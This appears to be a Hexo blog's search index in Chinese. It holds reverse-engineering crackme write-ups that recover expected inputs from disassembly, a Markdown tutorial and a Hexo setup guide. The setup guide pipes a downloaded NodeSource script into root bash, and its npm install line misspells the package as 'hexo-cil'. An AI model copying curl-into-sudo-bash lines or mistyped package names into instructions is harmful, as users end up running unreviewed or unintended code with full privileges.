class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">00401056  jmp     short 00401061</span><br><span class="line">00401058  mov     eax, dword ptr [ebp-4]</span><br><span class="line">0040105B  add     eax, 1</span><br><span class="line">0040105E  mov     dword ptr [ebp-4], eax</span><br><span class="line">00401061  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">00401064  cmp     ecx, dword ptr [ebp-8]</span><br><span class="line">00401067  jge     short 004010A7</span><br><span class="line">00401069  mov     edx, dword ptr [ebp-4]</span><br><span class="line">0040106C  movsx   eax, byte ptr [edx+42CC9C]</span><br><span class="line">00401073  and     eax, 0F0</span><br><span class="line">00401078  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040107B  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">00401082  and     edx, 0C</span><br><span class="line">00401085  sar     edx, 2</span><br><span class="line">00401088  or      eax, edx</span><br><span class="line">0040108A  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040108D  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">00401094  and     edx, 3</span><br><span class="line">00401097  shl     edx, 2</span><br><span class="line">0040109A  or      eax, edx</span><br><span class="line">0040109C  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040109F  mov     byte ptr [ecx+42CC9C], al</span><br><span class="line">004010A5  jmp     short 00401058</span><br><span class="line">004010A7  mov     dword ptr [ebp-4], 0</span><br><span class="line">004010AE  jmp     short 004010B9</span><br><span class="line">004010B0  mov     edx, dword ptr [ebp-4]</span><br><span class="line">004010B3  add     edx, 1</span><br><span class="line">004010B6  mov     dword ptr [ebp-4], edx</span><br><span class="line">004010B9  mov     eax, dword ptr [ebp-4]</span><br><span class="line">004010BC  cmp     eax, dword ptr [ebp-8]</span><br><span class="line">004010BF  jge     short 004010DD</span><br><span class="line">004010C1  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">004010C4  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">004010CB  mov     eax, dword ptr [ebp-4]</span><br><span class="line">004010CE  movsx   ecx, byte ptr [eax+429A30]</span><br><span class="line">004010D5  cmp     edx, ecx</span><br><span class="line">004010D7  je      short 004010DB</span><br><span class="line">004010D9  jmp     short 004010DD</span><br><span class="line">004010DB  jmp     short 004010B0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上为异常处理函数的主要处理逻辑，将0x42CC9C处字符串每一字符依次取出，将该字符的第四第三位和第二第一位对调，即若原字符为x<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>1</sub>x<sub>0</sub>，则现在的字符为x<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>1</sub>x<sub>0</sub>x<sub>3</sub>x<sub>2</sub>。<br>之后将转换后的字符串与0x429A30处字符串进行比较，该字符串为<code>\eluxfqvF|Puzzce</code><br>求解脚本如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> a[] = <span class="string">&quot;\\eluxfqvF|Puzzce&quot;</span>;</span><br><span class="line">   <span class="type">char</span> b,c,d;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">15</span>;i++)&#123;</span><br><span class="line">   b = a[i] &amp; <span class="number">240</span>;</span><br><span class="line">    c = (a[i] &amp; <span class="number">12</span>)&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    d = (a[i] &amp; <span class="number">3</span>)&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    a[i] = b | c | d;</span><br><span class="line">    </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求解得到结果<code>SecurityIsPuzzle</code>，在该字符串后任意添加两个字符即为flag。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/re2020/2022-07-15%20190714.jpg" alt="res"></p><h2 id="cpp-3">cpp.3</h2><p>使用IDA进行分析，在只读数据段发现如下数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0042805C dword_42805C    dd 0D76AA478h</span><br><span class="line">.rdata:00428060 dword_428060    dd 0E8C7B756h</span><br><span class="line">.rdata:00428064 dword_428064    dd 242070DBh</span><br><span class="line">.rdata:00428068 dword_428068    dd 0C1BDCEEEh</span><br><span class="line">.rdata:0042806C dword_42806C    dd 0F57C0FAFh</span><br><span class="line">.rdata:00428070 dword_428070    dd 4787C62Ah</span><br><span class="line">.rdata:00428074 dword_428074    dd 0A8304613h</span><br></pre></td></tr></table></figure><p>一眼MD5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_430]</span><br><span class="line">movsx   eax, [ebp+edx+var_424]</span><br><span class="line">cmp     eax, 61h</span><br><span class="line">jl      short loc_401195</span><br><span class="line">mov     ecx, [ebp+var_430]</span><br><span class="line">movsx   edx, [ebp+ecx+var_424]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jle     short loc_4011AA</span><br></pre></td></tr></table></figure><p>要求输入范围在a-z。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_434], 5    ;var_434中存储了输入字符串的长度</span><br><span class="line">jnb     short loc_4011C4</span><br></pre></td></tr></table></figure><p>要求输入长度为5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">push    4</span><br><span class="line">lea     eax, [ebp+var_424]          ;var_42C中存储输入的字符串</span><br><span class="line">push    eax             ; char *</span><br><span class="line">lea     ecx, [ebp+var_42C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">push    4               ; int</span><br><span class="line">lea     edx, [ebp+var_42C]</span><br><span class="line">push    edx             ; int</span><br><span class="line">lea     eax, [ebp+var_24]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    sub_401014</span><br></pre></td></tr></table></figure><p>是将输入串的前四个字节进行处理，sub_401014为加密函数。<br>加密后的字符串与&quot;b5c0b187fe309af0f4d35982fd961d7e&quot;进行比较。<br>我们使用脚本对该字符串进行求解，得到对应的明文为<code>love</code>，需要在后面添加任意一个小写字母。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/re2020/2022-07-15%20200510.jpg" alt="res"></p><h2 id="cpp-4">cpp.4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_7C]</span><br><span class="line">movsx   edx, [ebp+ecx+var_70]</span><br><span class="line">cmp     edx, 41h</span><br><span class="line">jl      short loc_4010B7</span><br><span class="line">mov     eax, [ebp+var_7C]</span><br><span class="line">movsx   ecx, [ebp+eax+var_70]</span><br><span class="line">cmp     ecx, 5Ah</span><br><span class="line">jle     short loc_4010CC</span><br></pre></td></tr></table></figure><p>可知输入的字符串要求全为大写字母，即A-Z。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_7C]</span><br><span class="line">movsx   edx, [ebp+ecx+var_70]</span><br><span class="line">sub     edx, 41h</span><br><span class="line">mov     [ebp+var_74], edx</span><br><span class="line">mov     eax, [ebp+var_74]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_74], edx</span><br><span class="line">mov     edx, [ebp+var_74]</span><br><span class="line">add     edx, 41h</span><br><span class="line">mov     eax, [ebp+var_7C]</span><br><span class="line">mov     [ebp+eax+var_70], dl</span><br><span class="line">jmp     short loc_4010D7</span><br></pre></td></tr></table></figure><p>由上述处理过程可知，将输入字符串每一字节减去0x41后与var_4进行相乘，再与var_8进行相加，再与26（0x1A）进行相除，取余（idiv命令中所得结果存在eax中，余数存于edx中），一眼仿射加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     [ebp+var_4], 9</span><br><span class="line">mov     [ebp+var_8], 7</span><br></pre></td></tr></table></figure><p>加密所得结果与&quot;SHUJDU&quot;进行比较。9模26的逆元为3。求得flag为<code>HANGON</code>。</p><h2 id="cpp-5">cpp.5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_20]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_20]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">cmp     eax, 8</span><br><span class="line">jz      short loc_40111D</span><br></pre></td></tr></table></figure><p>要求明文长度为8字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004280CC byte_4280CC     db  10h</span><br><span class="line">.rdata:004280CD                 db    7</span><br><span class="line">.rdata:004280CE                 db  14h</span><br><span class="line">.rdata:004280CF                 db  15h</span><br><span class="line">.rdata:004280D0                 db  1Dh</span><br><span class="line">.rdata:004280D1                 db  0Ch</span><br><span class="line">.rdata:004280D2                 db  1Ch</span><br><span class="line">.rdata:004280D3                 db  11h</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_24]</span><br><span class="line">movsx   ecx, ds:byte_4280CC[eax]</span><br><span class="line">mov     edx, [ebp+arg_4]</span><br><span class="line">add     edx, [ebp+var_24]</span><br><span class="line">mov     al, byte ptr [ebp+ecx+var_24+3]</span><br><span class="line">mov     [edx], al</span><br><span class="line">jmp     short loc_4018D3</span><br></pre></td></tr></table></figure><p>由上可知，这是DES算法的P置换，该算法为DES。也可以根据<code>sub_401C10</code>函数得到该函数是DES轮密钥的产生过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DES的初始密钥为0x54,0x61,0x6B,0x65,0x45,0x61,0x73,0x79</span><br><span class="line">加密所得的密文应该是0x28,0x70,0x77,0x48,0x7B,0x4F,0xFF,0x3D</span><br></pre></td></tr></table></figure><p>求得flag为<code>itiseasy</code>。</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本用法</title>
      <link href="/2022/07/b/"/>
      <url>/2022/07/b/</url>
      
        <content type="html"><![CDATA[<h2 id="编辑工具">编辑工具</h2><h3 id="Typora">Typora</h3><p>好用，目前收费，但可以白嫖（乐），具体下载地址请自行百度。还是推荐大家支持正版（叠甲）。</p><h3 id="Visual-Studio-Code">Visual Studio Code</h3><p><s>目前在用</s>，需要下载插件：</p><ul><li>Markdown All in One</li><li>Markdown Preview Enhanced</li></ul><h3 id="Obsdian">Obsdian</h3><p>用起来比较舒服。事常用工具</p><blockquote><p>不止于Markdown，后续应该会开个坑说说这个工具（应该，咕咕咕）</p></blockquote><h3 id="Notion">Notion</h3><p>原生支持Markdown，界面很简洁。且拥有很多强大的模板和功能<br>缺点：</p><ul><li>因为是上云的，且服务器在国外，所以打开比较慢（虽然我觉得速度还是可以接受）</li><li>数据可能会丢失 <s>(备份一下就好了)</s> （切记一定要备份）</li></ul><blockquote><p>TODO-List: 因为最近组里要求使用这个工具，后续可能会学习一下这个工具的使用（咕咕咕）</p></blockquote><h2 id="基本语法">基本语法</h2><p>基本语法使用几次就会了，学习成本不高。</p><h3 id="标题">标题</h3><p>使用<code>#</code>表示1-6级标题<br>不要忘了加空格，后同。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br><span class="line"><span class="section">##### 五级标题</span></span><br><span class="line"><span class="section">###### 六级标题</span></span><br></pre></td></tr></table></figure><h3 id="区块">区块</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; 这是一个区块</span></span><br></pre></td></tr></table></figure><p>效果</p><blockquote><p>这是一个区块</p></blockquote><p>也可以嵌套</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; 第一层</span></span><br><span class="line"><span class="quote">&gt; &gt; 第二层</span></span><br></pre></td></tr></table></figure><p>效果</p><blockquote><p>第一层</p><blockquote><p>第二层</p></blockquote></blockquote><h3 id="列表">列表</h3><p>可以使用序号或<code>-</code>表示列表</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 1</span><br><span class="line"><span class="bullet">2.</span> 2</span><br><span class="line"><span class="bullet">3.</span> 3</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 1</span><br><span class="line"><span class="bullet">-</span> 2</span><br><span class="line"><span class="bullet">-</span> 3</span><br></pre></td></tr></table></figure><p>效果</p><ol><li>1</li><li>2</li><li>3</li></ol><ul><li>1</li><li>2</li><li>3</li></ul><h3 id="代码块">代码块</h3><p>代码区块可以使用<code>```</code>将其包裹起来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="code">```c</span></span><br><span class="line"><span class="code">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="code">int main()&#123;</span></span><br><span class="line"><span class="code">    printf(&quot;Hello World\n&quot;);</span></span><br><span class="line"><span class="code">    return 0;</span></span><br><span class="line"><span class="code">&#125;```</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>行内代码块可以使用`包裹<br>如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">`printf`</span></span><br></pre></td></tr></table></figure><p>效果<br><code>printf</code></p><h3 id="数学公式">数学公式</h3><p>行内使用<code>$</code>，公式块使用<code>$$</code>，Markdown一般使用KaTex或MathJax进行渲染，具体的语法请自行查阅。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\frac&#123;\partial f&#125;&#123;\partial x&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>效果</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>f</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi>x</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial f}{\partial x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="表格">表格</h3><p>使用<code>|</code>来分隔不同的单元格，使用<code>-</code>来分割表头与表项。</p><p>冒号在左边表示左对齐，右边为右对齐，两边都有为中间对齐。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|a|b|c</span><br><span class="line">|:---|---:|:---:|</span><br><span class="line">|ABC|1|2|</span><br><span class="line">|abc|0|1|</span><br></pre></td></tr></table></figure><p>效果</p><table><thead><tr><th style="text-align:left">a</th><th style="text-align:right">b</th><th style="text-align:center">c</th></tr></thead><tbody><tr><td style="text-align:left">ABC</td><td style="text-align:right">1</td><td style="text-align:center">2</td></tr><tr><td style="text-align:left">abc</td><td style="text-align:right">0</td><td style="text-align:center">1</td></tr></tbody></table><h3 id="分割线">分割线</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---</span><br></pre></td></tr></table></figure><p>效果</p><hr><h3 id="链接">链接</h3><p>使用方式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">链接名称</span>](<span class="link">链接地址</span>)</span><br></pre></td></tr></table></figure><p>效果<br><a href="www.baidu.com">百度</a></p><h3 id="一些其他用法">一些其他用法</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*斜体文本*</span></span><br><span class="line"><span class="strong">**粗体文本**</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*粗斜体文本*</span>**</span></span><br><span class="line">~~删除线~~</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>带下划线文本<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line">2<span class="language-xml"><span class="tag">&lt;<span class="name">sup</span>&gt;</span></span>10<span class="language-xml"><span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span></span><br><span class="line">H<span class="language-xml"><span class="tag">&lt;<span class="name">sub</span>&gt;</span></span>2<span class="language-xml"><span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span>O</span><br></pre></td></tr></table></figure><p>其中上下标和下划线使用的是嵌入的html语句。<br>效果<br><em>斜体文本</em><br><strong>粗体文本</strong><br><em><strong>粗斜体文本</strong></em><br><s>删除线</s><br><u>带下划线文本</u></p><p>2<sup>10</sup><br>H<sub>2</sub>O</p><h3 id="嵌入html-css或javascript">嵌入html,css或javascript</h3><p>Markdown支持嵌入html,css或javascript。</p><h3 id="转义">转义</h3><p>Markdown使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown使用反斜杠转义特殊字符。<br>Markdown支持以下这些符号前面加上反斜杠以表示插入普通的符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">`   反引号</span><br><span class="line">*   星号</span><br><span class="line">_   下划线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  小括号</span><br><span class="line">#   井字号</span><br><span class="line">+   加号</span><br><span class="line">-   减号</span><br><span class="line">.   英文句点</span><br><span class="line">!   感叹号</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客撰写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 博客撰写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/hello-world/"/>
      <url>/2022/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><hr><p>更新于2023.11.24 <s>（虽然上面有更新时间）</s>(不准，还是看这个吧)</p><h2 id="环境安装">环境安装</h2><p>正好装了台新电脑，环境还是要配的。</p><h3 id="Windows">Windows</h3><p>懒了。<br>确切来说前几天帮人做了个nodejs做的electron项目，结果环境怎么都配不好（悲），遂放弃在Windows上继续折腾nodejs的想法。</p><h3 id="MacOS">MacOS</h3><p>没有，如果有好心人v我一个就试试</p><h3 id="Linux（Ubuntu）">Linux（Ubuntu）</h3><p>因为Linux发行版强大的包管理器（如apt,pacman），所以在Linux上配置环境相对来说是一件比较舒服的事情。Linux虚拟机折腾崩了还可以直接回滚。<br>因此主要在Ubuntu上折腾了一下（其他发行版懒得试了，除非我以后有想法换主力操作系统。btw，如果我想换主力操作系统，为什么不用Mac？）</p><h3 id="1-安装nodejs">1.安装nodejs</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - &amp;&amp;\</span><br><span class="line">sudo apt install nodejs</span><br></pre></td></tr></table></figure><p>这是比较简单的安装方法，也可以参考网上的方法安装较新版本的。不过我一般是能偷懒就偷懒，这儿照例偷个小懒。</p><h3 id="2-安装hexo">2.安装hexo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cil</span><br></pre></td></tr></table></figure><p>这之后使用官方给出的命令进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>看到这个就成了<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/hello-world/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-24%20180738.png" alt="效果"></p><h3 id="3-配置主题">3.配置主题</h3><p>懒了(雾)，根据官方文档和自己喜好配置即可。</p><h3 id="4-部署到github">4.部署到github</h3><p>修改<code>_config.yml</code>文件(整个项目下的，不是themes下的)，主要修改<code>repository</code>和<code>branch</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/username/repo_name</span><br><span class="line">  branch: main </span><br></pre></td></tr></table></figure><p>可以使用ssh传到github，也可以使用用户名+token，这里说说后一种。<br>进入github，点击头像-&gt;settings-&gt; Deployer Settings-&gt;Personal Access Token-&gt;Token，选择Generate new token创建token。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/hello-world/2024-11-03150054.png" alt="页面"><br>创建的token记得保存，因为刷新以后就看不到了。<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/hello-world/2024-11-03150304.png" alt="创建"><br>使用<code>hexo d</code>,输入用户名和token即可。<br>效果：这个页面</p>]]></content>
      
      
      <categories>
          
          <category> 博客撰写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 博客撰写 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
